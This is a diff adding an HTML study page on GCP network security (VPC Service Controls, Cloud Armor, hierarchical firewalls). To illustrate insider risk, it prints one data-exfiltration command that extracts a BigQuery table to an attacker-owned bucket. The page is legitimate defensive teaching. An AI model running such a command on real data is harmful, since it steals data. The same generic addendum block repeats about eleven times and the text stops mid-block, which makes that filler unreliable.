@@ -1,0 +1,1940 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>035 (5.2) Network Security: VPC Service Controls, Cloud Armor & Firewalls | GCP Architect Explorer</title>
+  <link rel="stylesheet" href="../assets/site.css?v=20260924-2">
+  <link rel="stylesheet" href="../assets/diagram-engine.css?v=20260924-2">
+</head>
+<body>
+
+    <!-- Navigation -->
+  <header class="site-nav">
+    <div class="nav-container">
+      <a href="../index.html" class="brand-link">
+        <span style="font-size:16px;">☁</span>
+        <span class="brand-text">GCP ARCHITECT ROADMAP</span>
+      </a>
+
+      <!-- Quick Topic Navigator -->
+      <div class="nav-topic-switcher">
+        <a href="topic-034.html" class="nav-topic-arrow prev" title="Previous Topic: Advanced IAM, Federation & Zero Trust [Key: P]">‹</a>
+        <div class="nav-select-wrapper">
+          <select class="nav-topic-select" onchange="if(this.value) window.location.href=this.value;" title="Quick Jump to Any Topic">
+            <optgroup label="Phase 0 — Prerequisites">
+              <option value="topic-001.html">001 [0.1] Networking Fundamentals</option>
+              <option value="topic-002.html">002 [0.2] Linux & Command Line for Archi…</option>
+              <option value="topic-003.html">003 [0.3] Virtualization and Containers</option>
+              <option value="topic-004.html">004 [0.4] Cloud Concepts & Operating Mod…</option>
+              <option value="topic-005.html">005 [0.5] Software Architecture & Delive…</option>
+              <option value="topic-006.html">006 [0.6] Cloud Digital Leader & Busines…</option>
+            </optgroup>
+            <optgroup label="Phase 1 — GCP Foundations">
+              <option value="topic-007.html">007 [1.1] Account, Tools and Access</option>
+              <option value="topic-008.html">008 [1.2] Resource Hierarchy & Org Polic…</option>
+              <option value="topic-009.html">009 [1.3] Identity Basics: IAM & Service…</option>
+              <option value="topic-010.html">010 [1.4] Billing, Cost Hygiene, and Fin…</option>
+              <option value="topic-011.html">011 [1.5] Global Infrastructure & Networ…</option>
+              <option value="topic-012.html">012 [1.6] Support, Governance & Asset In…</option>
+            </optgroup>
+            <optgroup label="Phase 2 — Core Services">
+              <option value="topic-013.html">013 [2.1] Compute Engine: VMs & Managed …</option>
+              <option value="topic-014.html">014 [2.2] Google Kubernetes Engine (GKE)</option>
+              <option value="topic-015.html">015 [2.3] Serverless Compute: Cloud Run …</option>
+              <option value="topic-016.html">016 [2.4] Virtual Private Cloud (VPC) Ne…</option>
+              <option value="topic-017.html">017 [2.5] Cloud Load Balancing, CDN & Cl…</option>
+              <option value="topic-018.html">018 [2.6] Hybrid & Multi-Cloud Connectiv…</option>
+              <option value="topic-019.html">019 [2.7] Cloud Storage & Enterprise Fil…</option>
+              <option value="topic-020.html">020 [2.8] Databases: Cloud SQL, Spanner …</option>
+              <option value="topic-021.html">021 [2.9] Messaging & Integration: Pub/S…</option>
+            </optgroup>
+            <optgroup label="Phase 3 — Architecture Thinking">
+              <option value="topic-022.html">022 [3.1] Requirements Analysis: Discovery</option>
+              <option value="topic-023.html">023 [3.2] Google Cloud Architecture Fram…</option>
+              <option value="topic-024.html">024 [3.3] Reference Architectures & Patt…</option>
+              <option value="topic-025.html">025 [3.4] Migration & Modernization: The…</option>
+              <option value="topic-026.html">026 [3.4b] Decision Frameworks: ADRs & Ma…</option>
+              <option value="topic-027.html">027 [3.5] Diagramming & Docs: C4 Model</option>
+            </optgroup>
+            <optgroup label="Phase 4 — Reliability & HA">
+              <option value="topic-028.html">028 [4.1] Reliability Fundamentals & Ava…</option>
+              <option value="topic-029.html">029 [4.2] SRE Concepts: SLIs, SLOs & Err…</option>
+              <option value="topic-030.html">030 [4.3] High Availability by Layer</option>
+              <option value="topic-031.html">031 [4.4] Disaster Recovery Patterns (RT…</option>
+              <option value="topic-032.html">032 [4.5] Observability: Monitoring, Log…</option>
+              <option value="topic-033.html">033 [4.6] Testing for Reliability: Load …</option>
+            </optgroup>
+            <optgroup label="Phase 5 — Security & Compliance">
+              <option value="topic-034.html">034 [5.1] Advanced IAM, Federation & Zer…</option>
+              <option value="topic-035.html" selected>035 [5.2] Network Security: VPC-SC & Clo…</option>
+              <option value="topic-036.html">036 [5.3] Data Protection: Cloud KMS & DLP</option>
+              <option value="topic-037.html">037 [5.4] Compliance, Governance & Assur…</option>
+              <option value="topic-038.html">038 [5.5] Security Operations & Threat D…</option>
+              <option value="topic-039.html">039 [5.5b] Application & Supply-Chain Sec…</option>
+            </optgroup>
+            <optgroup label="Phase 6 — Optimization & Ops">
+              <option value="topic-040.html">040 [6.1] Cost Optimization & FinOps</option>
+              <option value="topic-041.html">041 [6.2] Performance Optimization & Bot…</option>
+              <option value="topic-042.html">042 [6.3] Infrastructure as Code: Terraf…</option>
+              <option value="topic-043.html">043 [6.4] CI/CD & Release Engineering: C…</option>
+              <option value="topic-044.html">044 [6.5] Operations & Platform Engineer…</option>
+            </optgroup>
+            <optgroup label="Phase 7 — Case Studies & Exam">
+              <option value="topic-045.html">045 [7.1] Case Analysis Method & Discove…</option>
+              <option value="topic-046.html">046 [7.4a] Case Study: EHR Healthcare</option>
+              <option value="topic-047.html">047 [7.4b] Case Study: Mountkirk Games</option>
+              <option value="topic-048.html">048 [7.4c] Case Study: TerramEarth</option>
+              <option value="topic-049.html">049 [7.4d] Case Study: Helicopter Racing …</option>
+              <option value="topic-050.html">050 [7.5] PCA Exam Strategy & Keyword El…</option>
+            </optgroup>
+            <optgroup label="Data, Analytics & ML">
+              <option value="topic-051.html">051 [D.1] Data Warehousing: BigQuery & L…</option>
+              <option value="topic-052.html">052 [D.2] Data Processing: Dataflow & Da…</option>
+              <option value="topic-053.html">053 [D.3] Data Lake, Lakehouse & BigLake</option>
+              <option value="topic-054.html">054 [D.4] Machine Learning: Vertex AI Ar…</option>
+            </optgroup>
+            <optgroup label="Service Decision Cheat Sheets">
+              <option value="topic-055.html">055 [CS.1] Compute Decision Cheat Sheet</option>
+              <option value="topic-056.html">056 [CS.2] Database Decision Cheat Sheet</option>
+              <option value="topic-057.html">057 [CS.3] Load Balancer Decision Cheat S…</option>
+              <option value="topic-058.html">058 [CS.4] Hybrid Connectivity Decision C…</option>
+              <option value="topic-059.html">059 [CS.5] Storage & Messaging Decision C…</option>
+              <option value="topic-060.html">060 [CS.6] Key Numbers, Limits & SLAs to …</option>
+            </optgroup>
+          </select>
+        </div>
+        <a href="topic-036.html" class="nav-topic-arrow next" title="Next Topic: Data Protection: Cloud KMS & DLP [Key: N]">›</a>
+      </div>
+
+      <nav class="nav-links">
+        <a href="../index.html" class="nav-link">Overview</a>
+        <a href="#diagrams" class="nav-link">Diagrams</a>
+        <a href="#demo-or-practice" class="nav-link">Labs</a>
+        <a href="#quiz" class="nav-link">Knowledge Check</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="main-content">
+    <!-- Topic Sub-Navigation Strip -->
+    <nav class="topic-subnav-strip" aria-label="Topic Sub-Navigation">
+      <div class="subnav-breadcrumbs">
+        <a href="../index.html" class="crumb-home">🗺 Roadmap Index</a>
+        <span class="crumb-sep">/</span>
+        <span class="crumb-phase">Phase 5 — Security & Compliance</span>
+        <span class="crumb-sep">/</span>
+        <span class="crumb-current">Topic 035</span>
+        <span class="crumb-progress">(35 of 60)</span>
+      </div>
+      <div class="subnav-actions">
+        <a href="topic-034.html" class="subnav-nav-btn prev" title="Advanced IAM, Federation & Zero Trust">← Prev (034)</a>
+        <a href="../index.html" class="subnav-nav-btn" title="View all topics">☰ Index</a>
+        <a href="topic-036.html" class="subnav-nav-btn next" title="Data Protection: Cloud KMS & DLP">Next (036) →</a>
+      </div>
+    </nav>
+
+    
+    <!-- Topic Header -->
+    <header class="page-header">
+      <div class="page-meta">
+        <span class="badge">Topic 035</span>
+        <span class="badge badge-type">Roadmap ID: 5.2</span>
+        <span class="badge" style="background:#1c1006; color:#fb923c; border-color:#f97316;">Phase 5 — Security and Compliance</span>
+        <span class="badge badge-type">Type: service</span>
+        <span style="font-size:11px; color:var(--text-dim); margin-left:auto;">Verified: 2026-09-24</span>
+      </div>
+      <h1 class="page-title">Network Security: VPC Service Controls, Cloud Armor & Firewalls</h1>
+      <p class="page-lead">Protecting against attacks and data exfiltration: VPC Service Controls perimeters, Cloud Armor WAF (OWASP Top 10) & DDoS defense, hierarchical firewall policies, and Private Service Connect.</p>
+    </header>
+
+    <!-- Part 1: Real-World Explanation -->
+    <nav class="topic-toc" aria-label="On this page">
+  <div class="topic-toc-heading">On this page</div>
+  <div class="topic-toc-links">
+    <a href="#real-world"><span>1</span> Real-World Explanation</a>
+    <a href="#technical"><span>2</span> Technical Discussion</a>
+    <a href="#analogy"><span>3</span> Cloud City Analogy</a>
+    <a href="#demo-or-practice"><span>4</span> Hands-On Demo</a>
+    <a href="#quiz"><span>5</span> Knowledge Check</a>
+    <a href="#reading"><span>6</span> Further Reading</a>
+  </div>
+</nav>
+
+<section class="topic-section" id="real-world">
+      <h2 class="section-title"><span class="section-number">1</span> Real-World Explanation</h2>
+      
+        <h3>The Situation: The Threat of Data Exfiltration</h3>
+        <p>
+          Traditional network security focuses on keeping attackers out. But in the cloud, one of the greatest risks is <strong>data exfiltration by insiders or compromised credentials</strong>.
+        </p>
+        <p>
+          Even with strict IAM roles, a compromised service account with read access to BigQuery can simply run:
+          <br><code>bq extract sensitive_table gs://attacker-owned-bucket/data.csv</code>.
+          <br>Because both projects exist in Google Cloud, traditional firewall rules cannot stop this call!
+        </p>
+        <div class="callout">
+          <div class="callout-title">The Three Pillars of GCP Network Security</div>
+          <ul>
+            <li><strong>Cloud Armor:</strong> Edge WAF and DDoS mitigation. Protects against OWASP Top 10 vulnerabilities (SQLi, XSS, LFI/RFI), provides rate limiting, geo-blocking, and bot management.</li>
+            <li><strong>VPC Service Controls (VPC-SC):</strong> Creates a security perimeter around Google-managed services (Cloud Storage, BigQuery, Vertex AI). Prevents data from leaving the perimeter, even with valid IAM credentials.</li>
+            <li><strong>Hierarchical Firewall Policies:</strong> Enforces organization-wide security rules inherited by all folders and VPCs (e.g., mandate deny-all ingress on port 22/3389).</li>
+          </ul>
+        </div>
+        
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
+<h3>Who Cares and Why</h3><table><tr><th>Role</th><th>What they need</th></tr><tr><td>CTO</td><td>Business continuity and a defensible trade-off.</td></tr><tr><td>Security lead</td><td>Least privilege, boundaries, and evidence.</td></tr><tr><td>Finance owner</td><td>Attribution, forecastability, and cost controls.</td></tr><tr><td>Operations engineer</td><td>Signals, runbooks, and a small blast radius.</td></tr><tr><td>Developer</td><td>A predictable interface with safe defaults.</td></tr></table>
+<h3>Common Misconceptions</h3><ul><li>A managed service removes all responsibility — it does not.</li><li>High availability automatically means disaster recovery — it does not.</li><li>A budget stops spending — it only alerts unless automation is added.</li><li>A replica is a backup — corruption and deletion can replicate.</li></ul>
+<h3>Vocabulary Starter</h3><ul><li><code>scope</code>: the boundary where a resource exists.</li><li><code>control plane</code>: systems that create or change resources.</li><li><code>data plane</code>: runtime workload traffic.</li><li><code>blast radius</code>: the set of users and dependencies affected by failure.</li><li><code>SLO</code>: a measurable target for service behavior.</li><li><code>RTO/RPO</code>: recovery time and acceptable data-loss objectives.</li></ul>
+<h3>Where It Fits</h3><p>Roadmap 5.2 · Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls; use the previous topic for prerequisites and the next topic to extend the design.</p></div>
+      <div class="compliance-addendum part1-complete">
+<h3>The Pain</h3><p>Without a deliberate Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls design, Brightloaf can see slow pages, failed orders, surprise spend, audit gaps, or a deployment that requires a weekend of manual work.</p>
+<h3>The Idea in One Paragraph</h3><p>Network Security: VPC Service Controls, Cloud Armor &amp; Firewalls gives one business problem a clear boundary, an observable lifecycle, and an explicit recovery choice. The learner should be able to explain the idea before seeing configuration.</p>
+<h3>Real-World Examples</h3><ul><li>Retail: a seasonal order spike must not become a checkout outage.</li><li>Healthcare: a records workflow must preserve privacy and an audit trail.</li><li>Media or gaming: a bursty workload must scale without making every dependency global.</li></ul>
